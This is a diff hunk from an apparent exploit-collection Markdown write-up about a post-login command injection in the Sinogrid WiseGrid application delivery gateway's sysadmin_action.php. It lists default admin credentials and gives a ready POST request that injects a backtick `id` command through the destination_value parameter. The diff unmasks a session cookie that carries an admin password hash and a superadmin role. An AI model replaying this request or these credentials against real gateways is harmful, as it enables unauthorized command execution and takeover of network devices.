@@ -88,7 +88,7 @@ web: admin/sinogrid
 ```
 ![](./.resource/信诺瑞得-WiseGrid慧敏应用交付网关-sysadmin_action.php-后台命令执行漏洞/media/2.png)![](./.resource/信诺瑞得-WiseGrid慧敏应用交付网关-sysadmin_action.php-后台命令执行漏洞/media/2.png)POST /bin/sysadmin_action.php?action=getinfo&operation=ping&destination_value=`id`&ping_count=3&sar_value=3&netstat_value=tcp&interface= HTTP/1.1
 Host: 
-Cookie: PHPSESSID=451********************df2; funcs=NNN; appversion=WiseGrid-V4.2.2R_17322; hbstate=alone; username=admin; passwordmd5=ef9ffdf6c1e2fe91d4e14b30323fb771; role=superadmin; authmode=LOCAL; session_time=1639643323; lang=zh; declaration=1; needSyn=false
+Cookie: PHPSESSID=4510o12llugti8k4f24971rdf2; funcs=NNN; appversion=WiseGrid-V4.2.2R_17322; hbstate=alone; username=admin; passwordmd5=ef9ffdf6c1e2fe91d4e14b30323fb771; role=superadmin; authmode=LOCAL; session_time=1639643323; lang=zh; declaration=1; needSyn=false
 Content-Length: 0
 Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"
 Accept: */*
